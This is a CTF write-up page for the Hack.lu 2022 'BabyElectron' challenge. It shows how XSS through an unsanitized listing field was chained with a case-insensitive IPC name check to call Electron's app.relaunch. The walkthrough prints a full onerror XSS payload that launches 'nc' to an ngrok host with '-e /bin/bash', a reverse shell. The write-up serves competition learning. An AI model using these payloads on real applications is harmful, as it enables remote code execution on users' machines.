@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <!-- title will be injected from _config.yml -->
+  <!-- Stylesheets -->
+  
+  <link rel="stylesheet" href="/assets/css/bootstrap.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="stylesheet" href="/assets/css/responsive.css">
+  <link rel="stylesheet" href="/assets/css/import_custom.css">
+
+  <link rel="shortcut icon" href="images/favicon.png" type="image/x-icon">
+  <link rel="icon" href="images/favicon.png" type="image/x-icon">
+
+  <!-- Responsive -->
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  <!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.js"></script><![endif]-->
+  <!--[if lt IE 9]><script src="js/respond.js"></script><![endif]--><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>BabyElectron | LetzPwn - Luxembourgish CTF Team</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="BabyElectron" />
+<meta name="author" content="Mike L." />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description So you wanted to get into Electron Pwning? Your friend found a nice app, leaked its backend source from a Github repo he found while doxing some Luxembourg Real Estate Company. Pwn away by getting RCE! If you run into problems while setting it up reach out. This is the first flagstore for babyelectron." />
+<meta property="og:description" content="Description So you wanted to get into Electron Pwning? Your friend found a nice app, leaked its backend source from a Github repo he found while doxing some Luxembourg Real Estate Company. Pwn away by getting RCE! If you run into problems while setting it up reach out. This is the first flagstore for babyelectron." />
+<link rel="canonical" href="/writeup/2022/10/29/babyelectron.html" />
+<meta property="og:url" content="/writeup/2022/10/29/babyelectron.html" />
+<meta property="og:site_name" content="LetzPwn - Luxembourgish CTF Team" />
+<meta property="og:image" content="/electron.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-10-29T09:10:05+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="/electron.png" />
+<meta property="twitter:title" content="BabyElectron" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Mike L."},"dateModified":"2022-10-29T09:10:05+00:00","datePublished":"2022-10-29T09:10:05+00:00","description":"Description So you wanted to get into Electron Pwning? Your friend found a nice app, leaked its backend source from a Github repo he found while doxing some Luxembourg Real Estate Company. Pwn away by getting RCE! If you run into problems while setting it up reach out. This is the first flagstore for babyelectron.","headline":"BabyElectron","image":"/electron.png","mainEntityOfPage":{"@type":"WebPage","@id":"/writeup/2022/10/29/babyelectron.html"},"url":"/writeup/2022/10/29/babyelectron.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="LetzPwn - Luxembourgish CTF Team" /></head><body>
+  <div class="page-wrapper"><!-- Main Header -->
+<header class="main-header">
+  <!-- Header Top -->
+  <div class="header-top">
+    <div class="auto-container clearfix">
+
+      <div class="top-left clearfix">
+        <ul class="info-list">
+          <li>The first Luxembourgish CTF Team</li>
+        </ul>
+      </div>
+
+      <div class="top-right">
+        <ul class="social-icons">
+          <li><a href="https://twitter.com/LetzPwn"><span class="fab fa-twitter"></span></a></li>
+          <li><a href="https://discord.gg/Qjt5zUc"><span class="fab fa-discord"></span></a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- Header Upper -->
+  <div class="header-upper">
+    <div class="inner-container">
+      <div class="auto-container clearfix">
+        <!--Logo-->
+        <div class="logo-outer">
+          <div class="logo"><a href="/"><img src="/assets/images/logo.png" alt=""
+                title="Gamon - Digital Gaming and Esports HTML Template" style="max-width: 260px;"></a></div>
+        </div>
+
+        <!--Nav Box-->
+        <div class="nav-outer clearfix">
+          <!--Mobile Navigation Toggler-->
+          <div class="mobile-nav-toggler"><span class="icon flaticon-menu-1"></span></div>
+
+          <!-- Main Menu -->
+          <nav class="main-menu navbar-expand-md navbar-light">
+            <div class="collapse navbar-collapse show clearfix" id="navbarSupportedContent">
+              <ul class="navigation clearfix pull-left">
+                
+                
+                <li class=""><a href="/">Home</a>
+                </li>
+                
+                
+                
+                <li class=""><a href="/about_us.html">About Us</a>
+                </li>
+                
+                
+                
+                <li class=""><a href="/events.html">News & CTFs</a>
+                </li>
+                
+                
+              </ul>
+
+                <ul class="navigation clearfix pull-right">
+                  
+                    
+                    <li class=""><a href="/sponsors.html">Sponsors</a> </li>
+                    
+                  
+                    
+                    <li class=""><a href="/writeups.html">Writeups</a> </li>
+                    
+                  
+                    
+                    <li class=""><a href="/contact.html">Contact</a> </li>
+                    
+                  
+                </ul>
+            </div>
+          </nav>
+          <!-- Main Menu End-->
+        </div>
+      </div>
+    </div>
+  </div>
+  <!--End Header Upper-->
+
+  <!-- Sticky Header  -->
+  <div class="sticky-header">
+    <div class="auto-container clearfix">
+      <!--Logo-->
+      <div class="logo pull-left">
+        <a href="/" title=""><img src="/assets/images/logo.png" style="max-width:100px;" alt="" title=""></a>
+      </div>
+      <!--Right Col-->
+      <div class="pull-right">
+        <!-- Main Menu -->
+        <nav class="main-menu clearfix">
+          <!--Keep This Empty / Menu will come through Javascript-->
+        </nav><!-- Main Menu End-->
+      </div>
+    </div>
+  </div><!-- End Sticky Menu -->
+
+  <!-- Mobile Menu  -->
+  <div class="mobile-menu">
+    <div class="menu-backdrop"></div>
+    <div class="close-btn"><span class="icon flaticon-close"></span></div>
+
+    <nav class="menu-box">
+      <div class="nav-logo"><a href="/"><img src="/assets/images/logo.png" alt="" title=""></a></div>
+      <div class="menu-outer">
+        <!--Here Menu Will Come Automatically Via Javascript / Same Menu as in Header-->
+      </div>
+      <!--Social Links--
+      <div class="social-links">
+        <ul class="clearfix">
+          <li><a href="#"><span class="fab fa-twitter"></span></a></li>
+          <li><a href="#"><span class="fab fa-facebook-square"></span></a></li>
+          <li><a href="#"><span class="fab fa-pinterest-p"></span></a></li>
+          <li><a href="#"><span class="fab fa-instagram"></span></a></li>
+          <li><a href="#"><span class="fab fa-youtube"></span></a></li>
+        </ul>
+      </div>-->
+    </nav>
+  </div><!-- End Mobile Menu -->
+</header>
+<!--Page Title-->
+<div itemscope itemtype="http://schema.org/BlogPosting">
+  <section class="page-banner" style="padding-bottom: 40px; background-image:url(/assets/images/background/1.png);">
+    <div class="auto-container">
+      <div class="inner-container clearfix">
+        <ul class="bread-crumb clearfix">
+          <li><a href="/index.html">Home</a></li> 
+          <li><a href="/writeups.html">Writeups</a></li>
+          <li><a href="#">Hack.lu 2022 CTF</a></li> <!-- TODO: correct href-->
+          <li itemprop="name headline">BabyElectron Writeup</li>
+        </ul>
+        <h1>BabyElectron Writeup</h1><ul class="custom-author">
+                <li>By <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span
+                      class="p-author h-card" itemprop="name">Mike L.</span></span>
+                </li>
+              </ul>
+              <br/><div class="custom-date">Oct 29, 2022</div>
+        <ul class="tags">
+          <li>Solves: 19/718 teams</li>
+          <li>Source: <a href="flu.xxx" target="_blank" rel="noopener noreferrer">flu.xxx</a></li>
+        </ul>
+    </div>
+  </section>
+  <!--End Page Title-->
+
+  <!--Sidebar Page Container-->
+  <div class="sidebar-page-containe" style="padding-top: 40px; background-color:#202020">
+    <div class="auto-container">
+      <div class="row clearfix">
+
+        <!--Content Side / Blog Detail-->
+        <div class="content-side col-lg-8 col-md-12 col-sm-12">
+          <div class="blog-detail">
+            <div class="lower-content writeup-content awsm" style="padding-top: 0px;">
+              <p> <h2 id="description">Description</h2>
+<p>So you wanted to get into Electron Pwning? Your friend found a nice app, leaked its backend source from a Github repo he found while doxing some Luxembourg Real Estate Company. Pwn away by getting RCE! If you run into problems while setting it up reach out. This is the first flagstore for babyelectron.</p>
+
+<p>There are two flags: one in /flag which you can submit here and one in /printflag which you can submit at babyelectronV2</p>
+
+<h1 id="the-challenge">The challenge</h1>
+<p>The whole source code of the app, as well as the server-side code was provided.</p>
+
+<p>The electon app could be used used to buy, sell and report real estate objects.
+You can also report a real estate listing, which is then checked by a bot. 
+The goal is to get code execution of the machine of the bot, which is visiting the reported listing.</p>
+
+<h1 id="the-solution">The solution</h1>
+<p>The solution comprised two steps:</p>
+<ul>
+  <li>First, you needed to get XSS in the electron app.</li>
+  <li>Second, you needed to abuse the IPC function and get RCE.</li>
+</ul>
+
+<h2 id="setup">Setup</h2>
+<p>To make our lives easier, we started the electon app with: <code class="language-plaintext highlighter-rouge">electron . --proxy-server=127.0.0.1:8080</code> to be able to route the traffic of the app through burp.
+Furhtermore, we enabled the developer tools by commenting out: <code class="language-plaintext highlighter-rouge">mainWindow.webContents.openDevTools()</code> in main.js</p>
+
+<h2 id="first-step---getting-xss">First step - Getting XSS</h2>
+<p>In the support.js function from the <code class="language-plaintext highlighter-rouge">app</code> code, we see the following:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// security we learned from a bugbounty report
+    listing.msg = DOMPurify.sanitize(listing.msg)
+
+    const div = `
+        &lt;div class="card col-xs-3" style="width: 18rem;"&gt;
+            &lt;span id="REL-0-houseId" style="display: none;"&gt;${listing.houseId}&lt;/span&gt;
+            &lt;img class="card-img-top" id="REL-0-image" src="../${listing.image}" alt="REL-img"&gt;
+            &lt;div class="card-body"&gt;
+              &lt;h5 class="card-title" id="REL-0-name"&gt;${listing.name}&lt;/h5&gt;
+              &lt;h6 class="card-subtitle mb-2 text-muted" id="REL-0-sqm"&gt;${listing.sqm} sqm&lt;/h6&gt;
+              &lt;p class="card-text" id="REL-0-message"&gt;${listing.message}&lt;/p&gt;
+              &lt;input type="number" class="form-control" id="REL-0-price" placeholder="${listing.price}"&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+        &lt;div&gt;
+            ${listing.msg}
+        &lt;/div&gt;
+  `
+</code></pre></div></div>
+<p>listing.msg does get sanitized, however the other parameter do not.
+The idea is to get script execution using <code class="language-plaintext highlighter-rouge">listing.message</code> parameter.</p>
+
+<p>On the first impression its only possible to write the listing.msg parameter which gets posted with the report to get XSS.
+As its gets sanitized, this is not possible.</p>
+
+<p>However, when selling a real estate you can specify the <code class="language-plaintext highlighter-rouge">listing.message</code> when intercepting the message with burp.
+So we altered the message parameter of to <code class="language-plaintext highlighter-rouge">&lt;img src=x onerror=\"alert(1);\"&gt;</code></p>
+
+<p>Then, we checked if the XSS worked, by visiting the support page with out own electron app. 
+Therefor we simply added a reference index.html s.t. it also had a link to the support page:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"nav-item"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"nav-link"</span> <span class="na">href=</span><span class="s">"../views/support.html"</span><span class="nt">&gt;</span>
+      Support
+    <span class="nt">&lt;/a&gt;</span>
+<span class="nt">&lt;/li&gt;</span>
+</code></pre></div></div>
+<p>And also included links on the support.html page to navigate back to the other pages:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div&gt;</span>
+    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"../views/index.html"</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;</span>
+    <span class="nt">&lt;a</span>  <span class="na">href=</span><span class="s">"../views/listings.html"</span><span class="nt">&gt;</span>Buy<span class="nt">&lt;/a&gt;</span>
+    <span class="nt">&lt;a</span>  <span class="na">href=</span><span class="s">"../views/portfolio.html"</span><span class="nt">&gt;</span>My Portfolio<span class="nt">&lt;/a&gt;</span>
+    <span class="nt">&lt;a</span>  <span class="na">href=</span><span class="s">"../views/support.html"</span><span class="nt">&gt;</span>Support<span class="nt">&lt;/a&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+</code></pre></div></div>
+
+<p>We then navigated to the support page and intercepted the http request with burp and filled in the id, given when reporting the listing.
+Thus, we could confirm the XSS.</p>
+
+<h2 id="step-2">Step 2</h2>
+
+<p>Now we need to get RCE with the XSS.
+Hacktricks has a nice atricle on how to get RCE from XSS in electon: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps
+As contextIsolation is tured on - <code class="language-plaintext highlighter-rouge">contextIsolation: true</code> in main.js, we figured, that we could give it a try via RCE via IPC.</p>
+
+<p>The preload.js contained the following:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">RendererApi</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="na">invoke</span><span class="p">:</span> <span class="p">(</span><span class="nx">action</span><span class="p">,</span> <span class="p">...</span><span class="nx">args</span><span class="p">)</span>  <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nx">ipcRenderer</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">RELaction</span><span class="dl">"</span><span class="p">,</span><span class="nx">action</span><span class="p">,</span> <span class="nx">args</span><span class="p">);</span>
+  <span class="p">},</span>
+<span class="p">};</span>
+</code></pre></div></div>
+<p>It looks like we have a ipc method called <code class="language-plaintext highlighter-rouge">invoke</code>.
+Lets check which function it allows us to execute in main.js:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nx">RELbuy</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">listingId</span><span class="p">){</span>
+  <span class="k">return</span>
+<span class="p">}</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">RELsell</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">houseId</span><span class="p">,</span> <span class="nx">price</span><span class="p">,</span> <span class="nx">duration</span><span class="p">){</span>
+  <span class="k">return</span>
+<span class="p">}</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">RELinfo</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">houseId</span><span class="p">){</span>
+  <span class="k">return</span>
+<span class="p">}</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">RElist</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">listingId</span><span class="p">){</span>
+  <span class="k">return</span>
+<span class="p">}</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">RELsummary</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">userId</span><span class="p">){</span>
+ <span class="k">return</span> 
+<span class="p">}</span>
+
+<span class="nx">ipcMain</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">"</span><span class="s2">RELaction</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">_e</span><span class="p">,</span> <span class="nx">action</span><span class="p">,</span> <span class="nx">args</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
+  <span class="c1">//if(["RELbuy", "RELsell", "RELinfo"].includes(action)){</span>
+  <span class="k">if</span><span class="p">(</span><span class="sr">/^REL/i</span><span class="p">.</span><span class="nf">test</span><span class="p">(</span><span class="nx">action</span><span class="p">)){</span>
+    <span class="nx">app</span><span class="p">[</span><span class="nx">action</span><span class="p">](...</span><span class="nx">args</span><span class="p">)</span>  
+  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="c1">// ?? </span>
+  <span class="p">}</span>
+<span class="p">})</span>
+</code></pre></div></div>
+
+<p>It looks like we can execute every method that starts with REL. However, the regex check is case insensitive.
+Lets see if we can find an electon api app function whose name start with <code class="language-plaintext highlighter-rouge">rel</code> that might be useful. 
+We find <code class="language-plaintext highlighter-rouge">relaunch</code> https://www.electronjs.org/de/docs/latest/api/app</p>
+
+<p>After a bit of trial and error and reading the docs, we could achive RCE with this javascript function: 
+<code class="language-plaintext highlighter-rouge">api.invoke("relaunch", {args: ["4.tcp.ngrok.io", "133573", "-e", "/bin/bash"], execPath:"nc"})</code></p>
+
+<p>Now we just needed to put that into our XSS script and let the bot visit it to get a reverse shell back.</p>
+
+<p>We posted that to /sell:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"message"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;img src=x onerror=</span><span class="se">\'</span><span class="s2">api.invoke('relaunch', {args: ['4.tcp.ngrok.io', '133573', '-e', '/bin/bash'], execPath:'nc'})</span><span class="se">\"</span><span class="s2">&gt;"</span><span class="w">
+</span></code></pre></div></div>
+<p>We then got the id back, which we then submitted to the bot and got a shell back. The shell only lasted for 15 secs, so we needed to be quick to print out both flag ^^. but after some attemts we got both flags.</p>
+
+<p>Big thanks to Alain who helped a lot during the challenge. :)</p>
+</p>
+            </div>
+          </div>
+
+          <!-- Other Options -->
+          <div class="post-share-options clearfix">
+            <!--
+            <div class="pull-left">
+              <ul class="tags">
+                <li><a href="#">Gaming</a></li>
+                <li><a href="matches.html">Matches</a></li>
+                <li><a href="#">Players</a></li>
+              </ul>
+            </div>
+            -->
+            <!--
+            <div class="social-links pull-right">
+              <ul class="social-links">
+                <li><a href="#"><span class="fab fa-twitter"></span></a></li>
+                <li><a href="#"><span class="fab fa-facebook-square"></span></a></li>
+                <li><a href="#"><span class="fab fa-pinterest-p"></span></a></li>
+                <li><a href="#"><span class="fab fa-instagram"></span></a></li>
+              </ul>
+            </div>
+            -->
+          </div>
+        </div>
+
+        <!--Sidebar Side-->
+        <div class="sidebar-side col-lg-4 col-md-12 col-sm-12">
+          <aside class="sidebar">
+
+            <!-- Tags Widget -->
+            <div class="sidebar-widget popular-tags">
+              <div class="widget-content">
+                <h4 class="sidebar-title">Task categories</h4>
+                
+                  <a href="#">web</a>
+                
+                  <a href="#">XSS</a>
+                
+                  <a href="#">RCE</a>
+                
+              </div>
+            </div>
+
+            <!-- Search -->
+            <!--
+            <div class="sidebar-widget search-box">
+              <form method="post" action="contact.html">
+                <div class="form-group">
+                  <input type="search" name="search-field" value="" placeholder="Search" required>
+                  <button type="submit"><span class="icon fa fa-search"></span></button>
+                </div>
+              </form>
+            </div>
+            -->
+
+            <!-- Post Widget -->
+            <div class="sidebar-widget popular-posts">
+              <div class="widget-content">
+                <h4 class="sidebar-title">Recent Writeups</h4>
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                <article class="post">
+                  <div class="post-inner">
+                    
+                    
+                    <figure class="post-thumb"><a href="/writeup/2019/10/27/Numtonce.html"><img src="/writeup/2019/10/27/website.png"
+                          alt=""></a></figure>
+                    <div class="post-info">Oct 29, 2022</div>
+                    <div class="text"><a href="/writeup/2019/10/27/Numtonce.html">Numtonce</a></div>
+                  </div>
+
+                </article>
+                
+                
+                
+                <article class="post">
+                  <div class="post-inner">
+                    
+                    
+                    <figure class="post-thumb"><a href="/writeup/2020/02/05/Draw_with_us.html"><img src="/writeup/2020/02/05/website.png"
+                          alt=""></a></figure>
+                    <div class="post-info">Oct 29, 2022</div>
+                    <div class="text"><a href="/writeup/2020/02/05/Draw_with_us.html">Draw with us</a></div>
+                  </div>
+
+                </article>
+                
+                
+              </div>
+            </div>
+
+            <!-- Category Widget -->
+            <!--
+            <div class="sidebar-widget categories">
+              <div class="widget-content">
+                <h4 class="sidebar-title">Categories</h4>
+                <ul class="blog-categories">
+                  <li><a href="blog-single.html">Gaming</a></li>
+                  <li><a href="blog-single.html">Matches</a></li>
+                  <li><a href="blog-single.html">Video games</a></li>
+                  <li><a href="blog-single.html">Esports</a></li>
+                  <li><a href="blog-single.html">Champions</a></li>
+                </ul>
+              </div>
+            </div>
+            -->
+          </aside>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<!-- End Sidebar Page Container -->
+
+	<!-- Main Footer -->
+  <footer class="main-footer">
+    	<div class="auto-container">
+        	<!--Widgets Section-->
+            <div class="widgets-section">
+            	<div class="row clearfix">
+                	
+                    <!--Column-->
+                    <div class="column col-lg-4 col-md-6 col-sm-12">
+						<div class="footer-widget logo-widget">
+							<div class="logo">
+                            	<a href="/index.html"><img src="/assets/images/logo.png" alt="" /></a>
+                            </div>
+							<div class="text"></div>
+						</div>
+					</div>
+					
+					<!--Column-->
+                    <div class="column col-lg-4 col-md-6 col-sm-12">
+						<div class="footer-widget links-widget">
+							<div class="widget-content">
+								<div class="footer-title">
+									<h2>Links</h2>
+								</div>
+								<div class="row clearfix">
+									<div class="column col-lg-6 col-md-6 col-sm-12">
+										<ul class="list">
+											<li><a href="/about_us.html">About</a></li>
+											<li><a href="/members.html">Our Team</a></li>
+											<li><a href="/events.html">News and CTFs</a></li>
+											<li><a href="/contact.html">Contact</a></li>
+										</ul>
+									</div>
+									<div class="column col-lg-6 col-md-6 col-sm-12">
+										<ul class="list">
+											<li><a href="/contact.html">Help & Support</a></li>
+											<li><a href="/privacy_policy.html">Privacy Policy</a></li>
+										</ul>
+									</div>
+								</div>
+							</div>	
+						</div>
+					</div>
+					
+					<!--Column                    <div class="column col-lg-4 col-md-6 col-sm-12">
+						<div class="footer-widget newsletter-widget">
+							<div class="footer-title">
+                            	<h2>Newsletter</h2>
+                            </div>
+							<div class="text">Subsrcibe us now to get the latest news and updates</div>
+							<div class="newsletter-form">
+                                <form method="post" action="contact.html">
+                                    <div class="form-group clearfix">
+                                        <input type="email" name="email" value="" placeholder="Email address" required>
+                                        <button type="submit" class="theme-btn newsletter-btn"><span class="fas fa-envelope"></span></button>
+                                    </div>
+                                </form>
+                            </div>
+						</div>
+					</div>
+					-->
+
+				</div>
+			</div>
+		</div>
+		
+		<!-- Footer Bottom -->
+		<div class="footer-bottom">
+			<div class="auto-container">
+				<!--Scroll to top-->
+				<div class="scroll-to-top scroll-to-target" data-target="html"><span class="flaticon-up-arrow"></span></div>
+				<!--Scroll to top-->
+				<div class="row clearfix">
+					<!-- Column -->
+					<div class="column col-lg-6 col-md-12 col-sm-12">
+						<div class="copyright">&copy; Copyrights, 2019 All Rights Reserved</div>
+					</div>
+					<!-- Column -->
+					<div class="column col-lg-6 col-md-12 col-sm-12">
+						<ul class="social-icons">
+							<li><a href="https://twitter.com/letzpwn"><span class="fab fa-twitter"></span></a></li>
+						</ul>
+					</div>
+				</div>
+			</div>
+		</div>
+		
+  </footer>
+  
+</div>
+<script src="/assets/js/jquery.js"></script>
+<script src="/assets/js/popper.min.js"></script>
+<script src="/assets/js/bootstrap.min.js"></script>
+<script src="/assets/js/jquery-ui.js"></script>
+<script src="/assets/js/jquery.fancybox.js"></script>
+<script src="/assets/js/owl.js"></script>
+<script src="/assets/js/appear.js"></script>
+<script src="/assets/js/wow.js"></script>
+<script src="/assets/js/scrollbar.js"></script>
+<script src="/assets/js/script.js"></script></body>
+
+</html>
